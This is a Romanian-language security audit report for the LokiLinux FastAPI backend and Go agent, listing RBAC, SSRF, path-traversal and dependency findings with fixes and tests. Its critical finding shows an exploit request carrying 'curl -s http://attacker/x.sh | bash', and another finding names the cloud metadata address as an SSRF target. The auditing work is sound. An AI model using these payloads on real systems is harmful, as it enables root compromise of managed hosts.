# LokiLinux — Audit de securitate FastAPI (runda 2)

> Dată: 2026-10-21 · Metodă: revizuire manuală a codului + audit automatizat cu subagenți
> (auth/RBAC pe toate cele 249 de route-uri, sweep pe sink-uri de injecție pe 229 de module,
> `pip-audit` pe setul exact de dependențe din `Dockerfile`).
> Scope: `backend/lokilinux/**` (FastAPI 0.138 / Python 3.11), cu extensie în
> `agent/internal/**` (executorul efectiv al joburilor).
> Legenda stare: **Fixed** (cod + test de regresie) · **Mitigated** · **Accepted Risk** (documentat) · **Open**.

## Executive summary

Auditul precedent (`SECURITY_AUDIT.md`, 2026-08-24) a clasificat CR-01 („VIEWER → RCE root pe
flotă") drept *Fixed*. Runda de acum arată că **fixarea a fost parțială**: matricea de
capabilități (`utils/capability_rbac.py`) a fost reparată pentru `CUSTOM_COMMAND`, dar
**celelalte job types care ajung pe ramura generică a agentului au rămas neacoperite**, iar
`required_capabilities()` a rămas *fail-open* pentru orice job_type necunoscut.

Rezultat: **1 Critical, 1 High, 6 Medium, 5 Low** — toate remediate în acest commit, cu
25 de teste de regresie noi (20 dintre ele eșuează pe codul pre-fix).

| Componentă | Pre-fix | Post-fix | Justificare |
|---|---:|---:|---|
| Authorization (job RBAC) | 3/10 | 8/10 | matrice fail-closed + guard la chokepoint + agent hardening |
| Injection (SQL/command/SSRF/path) | 7/10 | 9/10 | zero SQL injection; path traversal + SSRF remediate |
| Authentication | 6/10 | 6/10 | neschimbat — tokens opace, introspecție Better Auth |
| Supply chain | 5/10 | 8/10 | `uv.lock` resincronizat, 31 CVE-uri eliminate |
| Middleware / transport | 7/10 | 7/10 | CORS/rate-limit/body-limit/headers OK; binding porturi = Open (M-1) |

---

## Critical

### C-01 · VIEWER (și OPERATOR) → RCE root pe orice host agent — **Fixed**

**Locație**
- `backend/lokilinux/utils/capability_rbac.py:62-82` (`required_capabilities` — fail-open)
- `backend/lokilinux/utils/capability_rbac.py:104-121` (`assert_no_smuggled_command`, nou)
- `backend/lokilinux/services/job_service.py:307-314` (chokepoint)
- `agent/internal/agent/manager.go:802-820` (ramura generică a agentului)

**Ce era**
Două defecte independente, fiecare suficient:

1. `required_capabilities()` returna `set()` pentru orice `job_type` nemapat, iar
   `unauthorized_capabilities()` tratează mulțimea vidă ca „nimic interzis".
   `COMPLIANCE_IMPORT_CONTENT` nu avea mapping → creabil de **oricine**.
2. `POST /api/v1/jobs` accepta un parametru `parameters.command` pe **orice** job_type.
   Agentul (`manager.go`, ramura `default:`) executa `params["command"]` ca **root**
   pentru orice job_type pe care nu îl dispatchează către un handler dedicat — adică
   și pentru `CVE_SCAN` / `INVENTORY_SCAN` / `SECURITY_PATCH` / `REMEDIATION`, care
   **nu** sunt plafonate pe `EXEC_BASH`.

**Scenariu de exploatare**
1. Atacator autentificat cu rolul minim (`VIEWER`).
2. `GET /api/v1/servers` → lista de UUID-uri de agenți (endpoint cu `get_current_user` doar).
3. `POST /api/v1/jobs`:
   ```json
   {"name":"scan","job_type":"CVE_SCAN",
    "target_servers":{"agent_ids":["<agent-uuid>"]},
    "parameters":{"command":"curl -s http://attacker/x.sh | bash"}}
   ```
   - `assert_can_create("VIEWER","CVE_SCAN")` → `READ_SYSTEM` → `ALL_ROLES` → trece.
   - `CVE_SCAN` nu e în `_HOST_MUTATING_JOB_TYPES` → nu se cere ADMIN.
   - `CVE_SCAN` nu e în `_FORCE_APPROVAL_JOB_TYPES` → fără aprobare umană.
   - Agentul: `RequiredCapabilities("CVE_SCAN")` → `nil` (nu e în registry) → fără envelope,
     fără verificare de capabilitate → ramura generică execută comanda ca root.

**Remediere**
- `required_capabilities()` — **fail-closed**: un job_type nemapat cere `EXEC_BASH` (doar ADMIN).
  Un job_type nou trebuie mapat explicit ca să primească o poartă mai slabă.
- `assert_no_smuggled_command()` — un parametru `command` de nivel superior este permis **doar**
  pentru `CUSTOM_COMMAND` (singurul job type a cărui execuție *este* acel parametru).
- Guardul e apelat în `JobService.create_job` — **chokepoint-ul unic** prin care trec toate
  căile de creare (router, politici, workflow, servicii), nu doar în router.
- Agentul: ramura `default:` refuză acum orice job_type diferit de `CUSTOM_COMMAND`
  (ultima linie de apărare dacă vreodată control-plane-ul este compromis).

**Teste** — `backend/tests/security/test_security_audit.py`
(`test_a_command_parameter_cannot_be_smuggled` × 7, `test_job_service_rejects_a_smuggled_command` × 7,
`test_unmapped_job_type_is_not_free_for_everyone`), plus
`agent/internal/agent/manager_test.go::TestRunJob_UnknownTypeWithCommandIsRejected`.

---

## High

### H-01 · `CUSTOM_COMMAND` lipsește din registry-ul de capabilități al agentului — **Fixed**

**Locație** — `agent/internal/security/capabilities.go:45-59`, `agent/internal/agent/job_validation.go:114-117`

Control-plane-ul semna `CUSTOM_COMMAND` ca `EXEC_BASH`/`CRITICAL`
(`backend/lokilinux/services/job_envelope.py:51`), dar registry-ul Go nu avea intrarea.
`job_validation.go` respinge orice job_type necunoscut când `enforce_signed_jobs=true`
(`unknown_capability`) — adică **la activarea ultimului gate al rollout-ului
signed-jobs, fiecare comandă privilegiată din flotă este respinsă**, iar eșecul apare
doar ca șir în rezultatul jobului.

**Remediere** — intrarea `"CUSTOM_COMMAND": {CapExecBash, RiskCritical}` în registry.
**Test** — `agent/internal/security/capabilities_test.go::TestRegistryCoversCustomCommand`.

---

## Medium

| ID | Titlu | Locație | Stare | Remediere |
|---|---|---|---|---|
| M-01 | API-ul REST și metricile sunt publicate pe toate interfețele (`0.0.0.0:8000`, `0.0.0.0:9090`), ocolind proxy-ul TLS | `docker-compose.yml:406-407` | **Open** (contract de deployment documentat) | vezi „Riscuri rămase” |
| M-02 | Kill-switch-ul pluginului `ansible-automation` ocolit prin `POST /api/v1/jobs` | `backend/lokilinux/api/v1/routers/jobs.py` | **Fixed** | `assert_plugin_enabled(db, ANSIBLE_PLUGIN_NAME)` pentru `job_type=ANSIBLE_PLAYBOOK` |
| M-03 | OPERATOR putea declanșa `PLUGIN_INSTALL` (push de cod root în flotă); tabela de capabilități zice ADMIN | `backend/lokilinux/api/v1/routers/plugins.py:36-47` | **Fixed** | `require_role("ADMIN")` pe ruta de install |
| M-04 | Parametrul `command` (și `extra_vars`) scurs în răspunsurile de job pentru orice rol | `backend/lokilinux/api/v1/routers/jobs.py:43-50` | **Fixed** | denylist extinsă: `command`, `script`, `extra_vars` |
| M-05 | SSRF prin URL-ul de webhook Slack (setare admin, fără guard) | `backend/lokilinux/workers/notification_worker.py:76-90` | **Fixed** | `assert_safe_url()` înainte de POST |
| M-06 | Path traversal / scriere de fișier în afara `LOKILINUX_KEYS_DIR` prin `key_id` | `backend/lokilinux/kms/keys.py:25-36`, `backend/lokilinux/api/v1/routers/admin.py` (4 rute) | **Fixed** | validare `^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$` în `KeyManager` + `Path(pattern=…)` în router (422) |

### Detalii M-05 / M-06

**M-05** — `notifications.slack_webhook_url` era singurul URL controlat de utilizator trimis
*fără* guard; celelalte trei căi (storage, datastream, webhook de workflow) treceau deja prin
`assert_safe_url`. Un admin (sau un commit de setare compromis) putea pune
`http://169.254.169.254/latest/meta-data/` acolo, iar fiecare alertă genera un POST intern.

**M-06** — `key_id` era un path param interpolat direct în `os.path.join(keys_dir, key_id)`.
`key_id=".."` scria `v1.key` (o cheie Ed25519 PEM) și `metadata.json` cu un director
**deasupra** lui `LOKILINUX_KEYS_DIR`. Validatorul e în `KeyManager` (sursa autoritativă,
toți apelanții trec prin ea); `Path(pattern=…)` în router transformă tentativa în 422.

---

## Low

| ID | Titlu | Locație | Stare | Remediere |
|---|---|---|---|---|
| L-01 | `POST /admin/users` trimitea un `role` neverificat către providerul de identitate (`assign_role` validă, `create_user` nu) | `backend/lokilinux/api/v1/routers/admin.py:115-155` | **Fixed** | allowlist comună `_VALID_ROLES` |
| L-02 | `uv.lock` desincronizat cu `pyproject.toml`: `pyjwt==2.13.0` (13 CVE-uri), `cryptography 46.0.3` (7 CVE-uri), `orjson` și `boto3` lipsau/erau în plus | `backend/uv.lock` | **Fixed** | `uv lock` resincronizat |
| L-03 | `certifi 2026.7.22` (GHSA-6q48-6c7w-9gw2) și `urllib3 2.7.0` (3 CVE-uri) — dependențe transitive nerezolvate în lista de pin-uri din `Dockerfile` | `backend/Dockerfile:34-35` | **Fixed** | pin-uri explicite `certifi==2026.10.19 urllib3==2.8.0` |
| L-04 | `testcontainers==4.13.1` nu își declară cele două distribuții care conțin `testcontainers.core.container` și `testcontainers.postgres` — mediul de test nu era reproductibil | `backend/pyproject.toml` (dev extra) | **Fixed** | `testcontainers-core` / `testcontainers-postgres` declarate explicit |
| L-05 | Endpointul `/metrics` (Prometheus, port 9090) nu are autentificare | `backend/lokilinux/metrics.py` | **Accepted Risk** (counters fără etichete sensibile) | — |

---

## Riscuri rămase (ne remediate, cu justificare)

1. **M-01 — porturi publicate pe `0.0.0.0`.** `docker-compose.yml:406-407` publică
   `8000:8000` (REST) și `9090:9090` (metrici) pe toate interfețele. Proxy-ul Nitro de pe
   `:3000` este intrărea publică documentată („single public entry point"), dar un consumator
   extern poate ajunge direct la API pe HTTP clar — token-urile `Bearer` circulă necriptate,
   iar verificările de Origin/Host ale proxy-ului nu se aplică.
   *Remediere propusă (ne aplicată — ar încălca un contract de deployment documentat în
   `README.md:106` și `docs/modules/06-infrastructura.md`, și ar rupe un scraper Prometheus
   aflat pe alt host):*
   ```yaml
   ports:
     - "127.0.0.1:8000:8000"
     - "127.0.0.1:9090:9090"
   ```
   Portul `50051` (gRPC/mTLS) rămâne deschis intenționat — agenții se conectează la el.
2. **CSRF — neaplicabil.** API-ul autentifică exclusiv prin header `Authorization: Bearer`
   (`auth/jwks_validator.py:25-26`); nu există flux bazat pe cookie, deci un cross-site
   request nu poate purta credențiale. `CORSMiddleware` permite o singură origine explicită
   (`allow_origins=[settings.frontend_url]`).
3. **Token introspection în loc de verificare de semnătură.** `jwks_validator.py` validează
   tokenul opac Better Auth printr-o introspecție HTTPS, cu cache Redis de 60 s pe digest
   (nu pe token). Consecință: până la 60 s de validitate după logout/expirare.
   Acceptat ca design (Better Auth emite tokeni opaci); impact real: fereastra de 60 s.
4. **Session cache + logout.** `get_current_user` cachează sesiunea validată; un logout
   rămâne activ până la expirarea intrării în cache.
5. **`MANAGER` nu este asignabil** (`admin.py` allowlist) deși apare în README și în tabela de
   capabilități. Promovarea lui e o schimbare de comportament care cere semnătură proprie
   (`auth/permissions.py:14-18` o notează explicit ca follow-up).
6. **Approvals fără four-eyes** pe joburi, excepții și baseline-uri
   (`services/remediation_service.py:154-159` are check, `workflow_engine.py:878-890` are
   check; excepțiile și baseline-urile nu au). Neintenționat — `RemediationService.approve`
   chiar implementează no-self-approval; verificat linie cu linie.
7. **Metricile și `/ready` expun detalii de upstream** — fără impact pe date sensibile
   (doar status și contoare).

---

## Verificări executate

| Verificare | Comandă | Rezultat |
|---|---|---|
| Suite backend completă | `backend/.venv/bin/pytest tests/` | **1026 passed** (1001 pre-fix + 25 noi) |
| Teste noi vs. cod pre-fix | `git stash` pe `backend/lokilinux` → `pytest tests/security/test_security_audit.py` | **20 failed / 5 passed** pre-fix → **25 passed** post-fix |
| Suite agent | `cd agent && go test ./... -race -cover` | **ok** (toate pachetele) |
| Teste noi agent | `go test ./internal/agent/ ./internal/security/ -run "TestRunJob\|TestRegistry" -v` | **PASS** (4 teste) |
| Audit dependențe — mediu dev | `uvx pip-audit --path .venv/lib/python3.11/site-packages` | pre-fix: **31 CVE-uri în 4 pachete** → post-fix: **„No known vulnerabilities found”** |
| Audit dependențe — set exact de producție | `uv pip install` din lista de pin-uri din `Dockerfile` + `pip-audit` | **„No known vulnerabilities found”** |
| Lint / format | `ruff check` + `black --check` pe fișierele atinse | **curat**; 0 erori mypy *strict* noi (899 → 899) |
| Istoric git pentru secrete | `git log -p` / `git ls-files` | `.env` și `backend/.env` **neverificate**; niciun secret hardcodat în cod |

### Ce NU s-a schimbat (verificat intenționat)

- Arhitectura de transport (agent → control plane prin gRPC mTLS, out-dial).
- Formatul de job, schema DB, contractul API pentru joburi valide.
- Contractul de redactare al conținutului ansible — `extra_vars` e acum redactat, deci
  testul `tests/unit/test_storage_read_permission.py` a fost actualizat (testul codifica
  comportamentul vechi; niciun cod din frontend nu citește `job.parameters`).
